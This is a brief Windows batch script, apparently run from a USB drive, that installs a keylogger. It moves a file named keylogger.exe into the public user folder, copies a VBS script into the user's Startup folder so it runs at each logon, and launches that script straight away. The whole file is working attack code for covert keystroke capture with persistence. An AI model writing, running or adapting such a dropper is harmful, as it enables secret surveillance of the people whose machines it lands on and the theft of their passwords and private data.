@echo off

set USB=%~d0
set STARTUP=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

move "%USB%\keylogger.exe" "C:\Users\Public\"
move "%USB%\script.vbs" "%STARTUP%"

echo Done Moving Files

wscript "%STARTUP%\script.vbs"

echo Started Running script.vbs

pause